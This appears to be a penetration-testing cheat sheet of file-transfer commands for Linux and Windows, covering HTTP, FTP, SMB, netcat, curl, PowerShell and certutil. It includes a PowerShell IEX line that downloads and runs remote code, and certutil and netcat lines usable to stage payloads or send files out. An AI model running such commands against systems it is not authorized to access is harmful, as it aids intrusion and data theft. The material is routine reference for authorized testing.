## Linux
### PYTHON
```
python -m SimpleHTTPServer <PORT>
python2.7 -c "from urllib import urlretrieve; urlretrieve('<URL>', '<DESTINATION_FILE>')"
```

### FTP
```
sudo python3 -m pyftpdlib  -p 21 -w
```

### SMB
```
sudo smbserver.py -smb2support liodeus
```

### WGET
```
wget <URL> -o <OUT_FILE>
```

### CURL
```
curl <URL> -o <OUT_FILE>
```

### NETCAT
```
nc -lvp 1234 > <OUT_FILE> 
nc <IP> 1234 < <IN_FILE>
``` 

### SCP
```
pscp <SOURCE_FILE> <USER>@<IP>:<DESTINATION_FILE>
```
* * *
## Windows
### FTP 
```
echo open <IP> 21 > ftp.txt echo anonymous>> ftp.txt echo password>> ftp.txt echo binary>> ftp.txt echo GET <FILE> >> ftp.txt echo bye>> ftp.txt
ftp -v -n -s:ftp.txt
```

### SMB
```
copy \\<IP>\<PATH>\<FILE> # Linux -> Windows
copy <FILE> \\<IP>\<PATH>\ # Windows -> Linux
```

### Powershell
```
powershell (New-Object System.Net.WebClient).DownloadFile('<URL>', '<DESTINATION_FILE>')
powershell IEX (New-Object System.Net.WebClient).DownloadString('<URL>')
powershell "wget <URL>"
powershell -c "(new-object System.Net.WebClient).DownloadFile('<URL>', '<DESTINATION_FILE>')"
```

### Python
```
python.exe -c "from urllib import urlretrieve; urlretrieve('<URL>', '<DESTINATION_FILE>')"
```

### CertUtil
```
certutil.exe -urlcache -split -f "<URL>"
```

### NETCAT
```
nc -lvp 1234 > <OUT_FILE> 
nc <IP> 1234 < <IN_FILE>
```

### CURL
```
curl <URL> -o <OUT_FILE>
```